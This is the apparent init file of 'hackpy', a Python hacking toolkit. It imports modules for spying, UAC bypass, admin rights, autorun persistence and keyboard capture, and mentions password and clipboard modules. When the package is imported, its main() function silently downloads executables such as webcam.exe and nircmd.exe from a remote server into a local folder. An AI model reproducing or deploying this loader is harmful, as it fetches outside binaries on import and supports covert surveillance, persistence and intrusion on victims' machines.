logo = (r"""
    _  _     _   _                  _        ____
  _| || |_  | | | |   __ _    ___  | | __   |  _ \   _   _
 |_  ..  _| | |_| |  / _` |  / __| | |/ /   | |_) | | | | |
 |_      _| |  _  | | (_| | | (__  |   <    |  __/  | |_| |
   |_||_|   |_| |_|  \__,_|  \___| |_|\_\   |_|      \__, |
         Module Created by L1merBoy with Love <3     |___/
""")

# Import hackpy modules
from hackpy.spy         import *
from hackpy.uac        import *
from hackpy.info        import *
from hackpy.file        import *
from hackpy.power       import *
from hackpy.admin       import *
from hackpy.python      import *
from hackpy.autorun     import *
from hackpy.network     import *
from hackpy.commands    import *
from hackpy.settings    import *
from hackpy.keyboard    import *
#from hackpy.clipboard  import *
#from hackpy.activity   import *
#from hackpy.passwords  import *
from hackpy.protection  import *
from hackpy.messagebox  import *
from hackpy.taskmanager import *

# Download and check modules integrity
def main():
    # Create temp folders
    for folder in ['', 'executable', 'tempdata']:
        if not file.exists(module_location + '\\' + folder):
            file.mkdir(module_location + '\\' + folder)

    # Load all modules
    for module in ('webcam.exe', 'nircmd.exe'):
        module_path = module_location + '\\executable\\' + module
        if not file.exists(module_path):
            try:
                wget(server_url + '/HackPy/' + module, output = module_path)
            except:
                raise ConnectionError('Failed connect to HackPy server while downloading modules...')
if __name__ != '__main__':
    main()
else:
    print(logo)
